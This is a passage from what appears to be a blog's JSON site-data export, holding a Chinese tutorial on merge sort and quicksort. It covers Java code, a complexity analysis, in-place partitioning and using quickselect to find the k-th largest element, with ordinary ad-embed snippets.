%}\n</div>\n\n快排的核心思想是分治和分区。我们可以利用快排的思想，来解答开篇的问题：O(n)的时间复杂度内求解无序数组中第K大元素，比如4,2,5,12,3这样一组数据，第三大元素就是4。\n\n我们选择数组区间A[p...r]最后一个元素A[n-1]作为pivot，对数组A[0...n-1]进行原地分区，这样数组就分成了三部分，A[0...p-1]、A[p]、A[p+1...n-1]。\n\n\n如果p+1=K，那么A[p]就是要求解的元素，如果K>p+1，说明第K大元素出现在A[p+1...n-1]区间内，我们再按照上面的思路在A[p+1...n-1]内查找。同理，如果K< p+1，那我们就在A[0...p-1]区间内查找。\n\n我们再来看看，为什么上述解决问题的时间复杂度是O(n)呢？\n\n第一次分区查找，我们需要对大小为n的数组进行分区操作，遍历n个元素。第二次分区查找，只需要对大小为2/n的数组执行分区操作，需要遍历n/2个元素。以此类推，分区遍历的元素个数分别为n、n/2、n/4、n/8、n/16......直到区间缩小为1.\n\n如果我们把每次分区遍历的元素个数加起来，就是：n+n/2+n/4+n/8+......+1。这是一个等比数列求和。最后的和为2n-1，所以上述解决问题的时间复杂度为O(n)。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n归并排序和快速排序是两种稍微复杂的排序算法，他们用的都是分治的思想，代码都是通过递归来实现的。过程非常相似。理解归并排序的重点是理解递推公式和merge合并函数。同理，理解快排的重点是理解递推公式和partation分区函数。\n\n归并排序是一种在任何情况下时间复杂度都比较稳定的算法，这也使得它具有了致命的弱点，即归并排序并不是原地排序算法，空间复杂度比较高，是O(n)。正应为此，他也没有快排应用广泛。\n\n快速排序算法虽然最坏情况时间复杂度是O(n^2),但是平均情况下时间复杂度都是$O(n\\*log_{2}n)$。不仅如此，快速排序时间复杂度退化到O(n^2)的概率也非常小，我们可以通过合理的选择pivot来避免这种情况。\n\n\n### 课后思考\n\n1、现在你有10个接口访问日志文件，每个日志文件大小300MB，每个日志文件里的日志都是按照时间戳从小到大排序的。你希望将这10个较小的日志文件，合并为一个日志文件，合并之后的日志仍然按照时间从小到大排序。如果处理上述排序任务的机器内存只有1GB，你有什么好的解决思路，能快速的将10个日志文件合并吗？\n\n多路归并、外排序\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-排序(中).md","raw":"---\ntitle: 算法-排序(中)\ndate: 2018-09-23 11:44:14\ntags: ['算法','排序','快速排序','归并排序','']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n上一节讲到冒泡排序、插入排序、选择排序这三种排序算法，他们的时间复杂度都是$O(n^2)$，比较高，适合小规模的排序。今天讲两种时间复杂度为$O(nlogN)$的排序算法，**归并排序**和**快速排序**。这两种算法适合大规模的数据排序，比上一节的三种算法更常用。\n\n归并排序和快速排序都用到了分治思想，非常巧妙，我们可以借鉴这个思想，来解决非排序的问题，比如：**如何在O(n)时间复杂度内查找一个无序数组中的第K大元素？**，这就要用到今天讲的内容。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 归并排序的原理\n{% endnote %}\n</div>\n\n我们先来看看**归并排序**。\n\n归并排序的核心思想还是蛮简单的。如果需要排序一个数组，我们先把数组从中间分成前后两部分，然后对前后两部分分别排序，再将排好序的两部分合并在一起，这样整个数组就有序了。\n\n{% asset_img 归并排序原理图.jpg 归并排序原理图 %}\n\n归并排序使用的就是分治思想。分治，顾名思义就是分而治之。将一个大问题分解为若干个小问题来解决，小问题解决了，大问题也就解决了。\n\n从我们刚才的描述，你有没有感觉到，分治思想跟我们前面讲过的递归想想很想。是的，分治思想一般都是用递归来实现的。**分治是一种解决问题的处理思想，递归是一种编程技巧**，这两者并不冲突。\n\n前面我通过举例让你对归并有了一个感性的认识，又告诉你，归并排序用的是分治思想，可以用递归来实现。我们现在就来看看如何用递归代码实现归并排序。\n\n我们在递归那一节讲的递归代码的编程技巧你还记得吗？递归代码的技巧就是，分析得出递推公式，然后找到终止条件，最后将递推公式翻译成递归代码。所以，要想写出归并排序的代码，我们先写出归并排序的递推公式。\n\n```java\n递推公式\nmerge_sort(p...r) = merge(merge_sort(p...q), merge_sort(q+1...r))\n\n终止条件\np>=r 不在继续分解\n```\n\n我来解释一下这个公式，merge_sort(p...r)表示给下标在p到r之间的数组排序，我们将这个问题转化为了两个子问题，merge_sort(p...q)和merge_sort(q+1...r)，其中下标q就是p和r的中间位置，也就是q=(p+r)/2,。当下标p到q和从q+1到r这两个子数组都排好序之后，我们在将两个有序的子数组合并在一起，这样下标p到r之间的数据也就排好序了。\n\n有了递推公式，转化成代码就简单多了。\n\n```java\n// 归并排序\npublic static void merge_sort(int[] a, int n){\n    merge_sort(a, 0, n-1);\n}\nprivate static void merge_sort(int[] a, int p, int r){\n    // 递归终止条件\n    if (p>=r) return;\n    // 获取分区点\n    int q = p + (r-p)/2;\n    // 分治排序左边\n    merge_sort(a, p, q);\n    // 分治排序右边\n    merge_sort(a, q+1, r);\n    // 将p-q 和 q+1-r 两个数组合并为一个数组并赋值给a[p,r]\n    merge(a, p, q, r);\n}\n\n// 合并数组\nprivate static void merge(int[] a, int p, int q, int r){\n    int i = p;\n    int j = q + 1;\n    int k = 0;\n    // 合并数组 a[p, q]  a[q+1, r] 到临时数组temp\n    // 申请一个临时数组\n    int[] temp = new int[r - p + 1];\n    // 根据两个数组最短的长度进行比较添加到temp中\n    while (i<=q&& j<=r){\n        if (a[i]<=a[j]){\n            temp[k++] = a[i++];\n        }else {\n            temp[k++] = a[j++];\n        }\n    }\n\n    // 看哪个数组还没有完成，将其放到temp后\n    if (i<=q){\n        while (i<=q){\n            temp[k++] = a[i++];\n        }\n    }else {\n        while (j<=r){\n            temp[k++] = a[j++];\n        }\n    }\n    System.out.println(Arrays.toString(temp));\n\n    // 将temp中对应的数据放入原数组中\n    for (i = 0; i <= r-p; i++) {\n        a[p+i] = temp[i];\n    }\n}\n```\n\n你可能已经发现了，merge(A[p...r], A[p...q], A[q+1...r])这个函数的作用就是，讲已经有序的A[p...q]和A[q+1...r]合并成另一个有序的数组，并且放入A[p...r]。那这个过程具体该怎么做呢？\n\n如图所示，我们申请一个临时数组temp，大小与A[p...r]相同。我们用两个指针i，j分别指向A[p...q]和A[q+1...r]的第一个元素，比较这两个元素A[i]和A[j]，如果A[i]小于A[j]，我们就把A[i]放入temp数组中，并将i后移一位，否则将A[j]放入temp数组中，j后移一位。\n\n继续上述比较过程，知道其中一个子数组中的所有数据都放入临时数组中，再把另外一个数组中的数据依次加入到temp数组的末尾。这个时候，临时数组temp中存储的就是两个子数组合并之后的结果了。最后再把临时数组temp中数据拷贝到原数组里A[p...r]中。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 归并排序的性能分析\n{% endnote %}\n</div>\n\n还记得上节课分析排序算法时的三个问题吗？接下来，我们来看一看归并排序的三个问题。\n\n**第一、 归并排序是稳定的排序算法吗？**\n\n结合我们前面的原理图和归并排序的代码，不难发现，归并排序稳不稳定关键要看merge函数，也就是两个有序数组合并为一个有序数组时的那部分代码。\n\n在合并的过程中，如果A[p...q]和A[q+1...r]之间有值相同的元素，我们可以像上面代码中那样，先把A[p...q]中的元素放入临时数组temp中，这样就保证了值相同的元素，合并前后顺序并不会改变。所以，归并排序是一个稳定的排序算法。\n\n**第二、归并排序的时间复杂度是多少？**\n\n归并排序涉及递归，时间复杂度的分析稍微有点复杂，我们正好借此机会来学习一下，如果很细递归代码的时间复杂度。\n\n在递归那一节我们讲过，递归适用场景是，一个问题a可以分解为多个子问题b、c，那求解问题a就可以分解为求解子问题b、c。子问题b、c解决之后，我们再把b、c的结果合并成a的结果。\n\n我们定义求解问题a的时间为T(a)，求解问题b、c的时间分别是T(b)、T(c),那我们就可以得到这样的递推公式：$T(a) = T(b) + T(c) + K$。其中K是将两个子问题b、c的结果合并所需的时间。\n\n从上面的分析，我们得出一个重要的结论：**不仅递归求解的问题可以写成递推公式，递推代码的时间复杂度也可以写成递推公式**。\n\n套用这个公式，我们来分析一下归并排序的时间复杂度。\n\n我们假设对n个元素进行归并排序需要的时间是T(n)，那分解成两个子数组排序的时间都是T(n/2)。我们知道，merge函数合并两个有序子数组的时间复杂度是O(n)。所以套用前面的公式，归并排序的时间复杂度计算公式是：\n$$ \n\\begin{cases}\nT(1) = C; & n=1 \\\\\\\\[2ex]\nT(n) = 2\\*T(\\frac{n}{2}) + n; &  n>1 \n\\end{cases}\n$$\n\n通过这个公式，如何来求解T(n)呢？还不够直观，我们再来进一步分解一下计算过程\n\n$$\n\\\\begin{align\\*}\nT(n) \\\\ &= \\\\ 2\\*T(\\frac{n}{2}) \\\\ + \\\\ n \\\\\\\\[2ex]\n&= 2\\*(2 \\* T(\\frac{n}{4}) + \\frac{n}{2}) \\\\  + \\\\ n \\qquad = 4\\*T(\\frac{n}{4}) + 2\\*n \\\\\\\\[2ex]\n&= 4\\*(2\\* T(\\frac{n}{8}) + \\frac{n}{4}) \\\\  + \\\\ 2 \\* n \\\\ \\; = 8\\*T(\\frac{n}{8}) + 3\\*n \\\\\\\\[2ex]\n&= 8\\*(2\\* T(\\frac{n}{16}) + \\frac{n}{8}) \\\\  + \\\\ 3 \\* n \\\\ \\; = 16\\*T(\\frac{n}{16}) + 4\\*n \\\\\\\\[2ex]\n&= ...... \\\\\\\\[2ex]\n&= 2^{k} \\* T(\\frac{n}{2^{k}}) + k \\* n\n\\\\end{align\\*}\n$$\n\n这样一步步推导，我们可以得到$T(n) \\\\ = \\\\ 2^{k} \\* T(\\frac{n}{2^{k}}) + k \\* n $。当$T(\\frac{n}{2^{k}})=T(1)$时，也就是$\\frac{n}{2^{k}} = 1$时，我们得到$k = log_{2}n$。我们将k值带入上面的公式得到$T(n) \\\\ = \\\\ Cn + n\\*log_{2}n$。如果我们用大O表示法来表示的话，$T(n)$就等于$O(n\\*log_{2}n)$。所以归并排序的时间复杂度是$O(n\\*log_{2}n)$。\n\n从我们的原理分析和代码可以看出，归并排序的执行效率与要排序的原始数组的有序程度无关，所以其时间复杂度是非常稳定的，不管最好、最坏、平均情况时间复杂度都为$O(n\\*log_{2}n)$。\n\n**第三、归并排序是不是原地排序算法呢？**\n\n归并排序的时间复杂度在任何情况下都是$O(n\\*log_{2}n)$，看起来非常优秀。待会你会发现，即使是快速排序，最坏情况下时间复杂度也是$O(n^2)$，但是归并排序并不像快排那样，应用广泛，这是为什么？因为它有一个指明的弱点，那就是归并排序并不是一个原地排序算法 。\n\n这是因为归并排序的合并函数，在合并两个有数组为一个有序数组时，需要借助额外的临时存储空间。这一点很好理解，那归并排序的空间复杂度到底是多少呢？是O(n),还是$O(n\\*log_{2}n)$，该如何分析呢？\n\n如果我们继续按照分析递归时间复杂度的方法，通过递推公式来求解，那整个归并排序的空间复杂度就是$O(n\\*log_{2}n)$。不过类似分析时间复杂度那样来分析空间复杂度，这个思路对吗？\n\n实际上，递归代码的空间复杂度并不像时间复杂度那样累加。我们刚刚忘了最重要的一点，那就是，尽管每次合并都需要申请额外的临时空间，但是在合并完成之后，临时空间就会被释放。在任意时刻，CPU只会有一个函数在执行，也就是只有一块临时空间在使用，临时空间内存大小最大不会超过n，所以归并排序的空间复杂度是O(n)。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 快速排序的原理\n{% endnote %}\n</div>\n\n我们再来看快速排序的原理，我们习惯性的把它简称为“快排”，快排利用的也是分治思想。乍看起来，他有点像归并排序，但其实思路完全不一样，待会再看两者的区别。现在我们先来看看快排的核心思想。\n\n快排的思想是这样的，如果要排序数组中从下标p-r之间的一组数据，我们选择p到r之间的任意一个数作为pivot分区点。\n\n第一次遍历，我们将p到r之间的数据分为两部分。将小于pivot的放到左边，将大于pivot的放到右边。讲过这一步之后，p-r之间的数据就被分成了三部分，前面p到q-1之间的数据都是小于pivot的，中间是pivot，后面q+1到r之间的数据都是大于pivot的。\n\n根据分治、递归的思想，我们可以用递归排序p到q-1之间的数据和下边在q+1到r之间的数据，知道区间缩小为1，就说明所有的数据都有序了。\n\n如果我们用递推公式来将上面的过程写出来的话，就是这样：\n\n```java\n# 递推公式\nquick_sort(p...r) = quick_sort(p...q-1)+quick_sort(q+1...r)\n\n# 终止条件\np>=r\n```\n\n我将递推公式转换为递归代码，你可以根据代码将其翻译为你熟悉的任何语言的代码。\n\n```java\nprivate static void quickSort(int[] arr, int n) {\n    if (n < 1) return;\n    quickSort(arr, 0 , n-1);\n}\nprivate static void quickSort(int[] arr, int left, int right) {\n    if (left>=right) return; \n    int mid = partation(arr, left, right);\n    quickSort(arr, left, mid-1);\n    quickSort(arr, mid+1, right);\n}\n\n// 查找中间位置\nprivate static int partation(int[] arr, int left, int right) {\n    int base = arr[left];\n    int i = left, j = right;\n\n    while(i<j){\n        while (i<j && arr[j] >= base) j--;\n        while (i<j && arr[i] <= base) i++;\n\n        if (i<j){\n            int temp = arr[i];\n            arr[i] = arr[j];\n            arr[j] = temp;\n        }\n    }\n\n    arr[left] = arr[i];\n    arr[i] = base;\n    return i;\n\n}\n\n// 查找中间位置\nprivate static int partation1(int[] a, int left, int right){\n    int pivot = a[right];\n    int i = left;\n    for (int j=left; j<=right-1;j++){\n        if (a[j]<pivot){\n            int temp = a[i];\n            a[i] = a[j];\n            a[j] = temp;\n            i++;\n        }\n    }\n    a[right] = a[i];\n    a[i] = pivot;\n    return i;\n}\n```\n\n归并排序有一个merge合并函数，快排这里也有一个partation分区函数。partation分区函数实际上我们前面已经讲过了，就是随机选择一个元素作为pivot，然后对A[p...r]分区，函数返回pivot的小标。\n\n如果我们不考虑空间消耗的话，partation分区函数可以写的非常简单。我们申请两个临时数组X和Y，遍历A[p...r]，将小于pivot的元素都拷贝到临时数组X中，将大于pivot的元素都拷贝到临时数组Y中，最后再讲数组X和数组Y中的数据顺序拷贝到数组A[p...r]中。\n\n不过如果按这种思路实现的话，partation函数就需要很多额外的内存空间，所以快排也就不是原地排序算法了。如果我们希望快排是原地排序算法，那它的空间复杂度都是O(1)，那partation分区函数就不能占用太多的内存空间，我们就需要在A[p...r]原地完成分区操作。\n\n原地分区函数的实现思路非常巧妙，我下面用伪代码实现：\n\n```java\npartation(a,p,r){\n    pivot := A[r]\n    i := p;\n\n    for j:=p to r-1 do {\n        if A[j] < pivot{\n            swap A[i] with A[j]\n            i := i+1\n        }\n    }\n    swap A[i] with A[r]\n    return i\n}\n```\n这里的处理有点类似于选择排序。我们通过游标i把A[p...r-1]分成了两部分，A[p...i-1]的元素都是小于pivot的，我们暂且叫它“已处理区间”，A[i...r-1] 是“未处理区间”。我们每次从未处理区间A[i...r-1]中取一个元素A[j]，与pivot对比，如果小于pivot，则将其加入到已处理区间的尾部，也就是 A[i] 的位置。\n\n数组的插入操作还记得吗？在数组某个位置插入元素，需要搬移数据，非常耗时。当时我们也讲了一种技巧，就是交换，在O（1）时间复杂度内完成插入操作。我们也借助这个思想，只需要将 A[i] 和 A[j] 交换，就可以在O（1）时间复杂度内将 A[j] 放到小标 i 的位置。\n\n因为分区的操作涉及交换操作，如果数组中出现两个相同的元素，比如序列6,8,7,6,3,5,9,4，在经过第一次分区之后，两个6的相对位置就会发现变化。所以快速排序并不是一个稳定的排序算法。\n\n到此，快速排序的原理你应该掌握了。现在，我们来看另一个问题：快速排序和归并排序都是用的分治思想，递推公式和递归代码也非常相似，那它们的区别到底在哪里呢？\n\n可以发现，归并排序的处理过程是由下到上的，先处理子问题，然后在合并。而快排正好相反，他的处理过程是由上到下的，先分区，然后处理子问题。归并排序虽然是稳定的，时间复杂度为$O(n\\*log_{2}n)$的排序算法，但是它是非原地排序算法。我们上面讲过，归并排序之所以不是原地排序算法，是因为合并函数无法在原地执行。而快排通过设计巧妙的分区函数，可以实现原地排序，解决了归并排序占用太多内存空间的问题。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 快速排序的性能分析\n{% endnote %}\n</div>\n\n现在我们来分析一下快速排序的性能。上面在讲解快排原理的时候，已经分析了快速排序的稳定性和空间复杂度。快排是一种原地、不稳定的排序算法，现在我们来分析一下快排的时间复杂度。\n\n快排也是用递归实现的，对于递归代码的时间复杂度，我前面总结的公式，这里也还是适用的。如果每次分区操作，都能正好把数组分成大小接近相等的两个小区间，那块拍的时间复杂度递推求解公式跟归并是一样的。所以快排的时间复杂度也是$O(n\\*log_{2}n)$。\n\n$$ \n\\\\begin{cases} \\\\\\\n\\\\ T(1) = C; & n=1 \\\\\\\\[2ex]\n\\\\ T(n) = 2\\*T(\\frac{n}{2}) + n; &  n>1\n\\\\end{cases}\n$$\n\n但是公式成立的前提是我们每次分区操作，选择的pivot都很合适，正好是将大区间对等一份为二，但这种情况是很难实现的。\n\n我举一个极端的例子，加入数组中的数据原来就已经是有序的了，比如1,3,5,6,8，如果我们每次选择最后一个元素作为pivot，那每次分区得到的两个区间都是不对等的。我们需要进行大约n次分区操作，才能完成快排的整个过程，这种情况下，快排的时间复杂度就从$O(n\\*log_{2}n)$退化成了$O(n^2)$。\n\n我们刚刚讲了两个极端情况下的时间复杂度，一个是分区极其均衡，一个是分区极其不均衡。他们分别对应到快排的最好时间复杂度和最坏情况时间复杂度。那快排的平均时间复杂度是多少呢？\n\n实际上，递归的时间复杂度的求解除了递推公式之外，还有递归树，在树那一节再讲，这里暂且不说，这里直接给出结论：快排的平均复杂度也是$O(n\\*log_{2}n)$，只有在极端情况下才会退化为$O(n^2)$。而且我们也有办法将这个概率降到很低，如何来做，我们后面排序优化再讲。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n快排的核心思想是分治和分区。我们可以利用快排的思想，来解答开篇的问题：O(n)的时间复杂度内求解无序数组中第K大元素，比如4,2,5,12,3这样一组数据，第三大元素就是4。\n\n我们选择数组区间A[p...r]最后一个元素A[n-1]作为pivot，对数组A[0...n-1]进行原地分区，这样数组就分成了三部分，A[0...p-1]、A[p]、A[p+1...n-1]。\n\n\n如果p+1=K，那么A[p]就是要求解的元素，如果K>p+1，说明第K大元素出现在A[p+1...n-1]区间内，我们再按照上面的思路在A[p+1...n-1]内查找。同理，如果K< p+1，那我们就在A[0...p-1]区间内查找。\n\n我们再来看看，为什么上述解决问题的时间复杂度是O(n)呢？\n\n第一次分区查找，我们需要对大小为n的数组进行分区操作，遍历n个元素。第二次分区查找，只需要对大小为2/n的数组执行分区操作，需要遍历n/2个元素。以此类推，分区遍历的元素个数分别为n、n/2、n/4、n/8、n/16......直到区间缩小为1.\n\n如果我们把每次分区遍历的元素个数加起来，就是：n+n/2+n/4+n/8+......+1。这是一个等比数列求和。最后的和为2n-1，所以上述解决问题的时间复杂度为O(n)。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n归并排序和快速排序是两种稍微复杂的排序算法，他们用的都是分治的思想，代码都是通过递归来实现的。过程非常相似。理解归并排序的重点是理解递推公式和merge合并函数。同理，理解快排的重点是理解递推公式和partation分区函数。\n\n归并排序是一种在任何情况下时间复杂度都比较稳定的算法，这也使得它具有了致命的弱点，即归并排序并不是原地排序算法，空间复杂度比较高，是O(n)。正应为此，他也没有快排应用广泛。\n\n快速排序算法虽然最坏情况时间复杂度是O(n^2),但是平均情况下时间复杂度都是$O(n\\*log_{2}n)$。不仅如此，快速排序时间复杂度退化到O(n^2)的概率也非常小，我们可以通过合理的选择pivot来避免这种情况。\n\n\n### 课后思考\n\n1、现在你有10个接口访问日志文件，每个日志文件大小300MB，每个日志文件里的日志都是按照时间戳从小到大排序的。你希望将这10个较小的日志文件，合并为一个日志文件，合并之后的日志仍然按照时间从小到大排序。如果处理上述排序任务的机器内存只有1GB，你有什么好的解决思路，能快速的将10个日志文件合并吗？\n\n多路归并、外排序\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-排序(中)","published":1,"updated":"2018-12-07T02:55:32.027Z","_id":"cjpdmv0ff003p4cv0mla829kv","comments":1,"layout":"post","photos":[],"link":"","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>上一节讲到冒泡排序、插入排序、选择排序这三种排序算法，他们的时间复杂度都是$O(n^2)$，比较高，适合小规模的排序。今天讲两种时间复杂度为$O(nlogN)$的排序算法，<strong>归并排序</strong>和<strong>快速排序</strong>。这两种算法适合大规模的数据排序，比上一节的三种算法更常用。</p>\n<p>归并排序和快速排序都用到了分治思想，非常巧妙，我们可以借鉴这个思想，来解决非排序的问题，比如：<strong>如何在O(n)时间复杂度内查找一个无序数组中的第K大元素？</strong>，这就要用到今天讲的内容。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"归并排序的原理\"><a href=\"#归并排序的原理\" class=\"headerlink\" title=\"归并排序的原理\"></a>归并排序的原理</h3></div><br></div>\n\n<p>我们先来看看<strong>归并排序</strong>。</p>\n<p>归并排序的核心思想还是蛮简单的。如果需要排序一个数组，我们先把数组从中间分成前后两部分，然后对前后两部分分别排序，再将排好序的两部分合并在一起，这样整个数组就有序了。</p>\n<img src=\"/posts/2018-09-23-算法-排序(中)/归并排序原理图.jpg\" title=\"归并排序原理图\">\n<p>归并排序使用的就是分治思想。分治，顾名思义就是分而治之。将一个大问题分解为若干个小问题来解决，小问题解决了，大问题也就解决了。</p>\n<p>从我们刚才的描述，你有没有感觉到，分治思想跟我们前面讲过的递归想想很想。是的，分治思想一般都是用递归来实现的。<strong>分治是一种解决问题的处理思想，递归是一种编程技巧</strong>，这两者并不冲突。</p>\n<p>前面我通过举例让你对归并有了一个感性的认识，又告诉你，归并排序用的是分治思想，可以用递归来实现。我们现在就来看看如何用递归代码实现归并排序。</p>\n<p>我们在递归那一节讲的递归代码的编程技巧你还记得吗？递归代码的技巧就是，分析得出递推公式，然后找到终止条件，最后将递推公式翻译成递归代码。所以，要想写出归并排序的代码，我们先写出归并排序的递推公式。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">递推公式</span><br><span class=\"line\">merge_sort(p...r) = merge(merge_sort(p...q), merge_sort(q+<span class=\"number\">1</span>...r))</span><br><span class=\"line\"></span><br><span class=\"line\">终止条件</span><br><span class=\"line\">p&gt;=r 不在继续分解</span><br></pre></td></tr></table></figure>\n<p>我来解释一下这个公式，merge_sort(p…r)表示给下标在p到r之间的数组排序，我们将这个问题转化为了两个子问题，merge_sort(p…q)和merge_sort(q+1…r)，其中下标q就是p和r的中间位置，也就是q=(p+r)/2,。当下标p到q和从q+1到r这两个子数组都排好序之后，我们在将两个有序的子数组合并在一起，这样下标p到r之间的数据也就排好序了。</p>\n<p>有了递推公式，转化成代码就简单多了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 归并排序</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">merge_sort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">    merge_sort(a, <span class=\"number\">0</span>, n-<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">merge_sort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> p, <span class=\"keyword\">int</span> r)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 递归终止条件</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (p&gt;=r) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 获取分区点</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> q = p + (r-p)/<span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 分治排序左边</span></span><br><span class=\"line\">    merge_sort(a, p, q);</span><br><span class=\"line\">    <span class=\"comment\">// 分治排序右边</span></span><br><span class=\"line\">    merge_sort(a, q+<span class=\"number\">1</span>, r);</span><br><span class=\"line\">    <span class=\"comment\">// 将p-q 和 q+1-r 两个数组合并为一个数组并赋值给a[p,r]</span></span><br><span class=\"line\">    merge(a, p, q, r);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 合并数组</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">merge</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a, <span class=\"keyword\">int</span> p, <span class=\"keyword\">int</span> q, <span class=\"keyword\">int</span> r)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = p;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> j = q + <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> k = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">// 合并数组 a[p, q]  a[q+1, r] 到临时数组temp</span></span><br><span class=\"line\">    <span class=\"comment\">// 申请一个临时数组</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span>[] temp = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[r - p + <span class=\"number\">1</span>];</span><br><span class=\"line\">    <span class=\"comment\">// 根据两个数组最短的长度进行比较添加到temp中</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (i&lt;=q&amp;&amp; j&lt;=r)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a[i]&lt;=a[j])&#123;</span><br><span class=\"line\">            temp[k++] = a[i++];</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            temp[k++] = a[j++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 看哪个数组还没有完成，将其放到temp后</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i&lt;=q)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (i&lt;=q)&#123;</span><br><span class=\"line\">            temp[k++] = a[i++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (j&lt;=r)&#123;</span><br><span class=\"line\">            temp[k++] = a[j++];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    System.out.println(Arrays.toString(temp));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 将temp中对应的数据放入原数组中</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt;= r-p; i++) &#123;</span><br><span class=\"line\">        a[p+i] = temp[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>你可能已经发现了，merge(A[p…r], A[p…q], 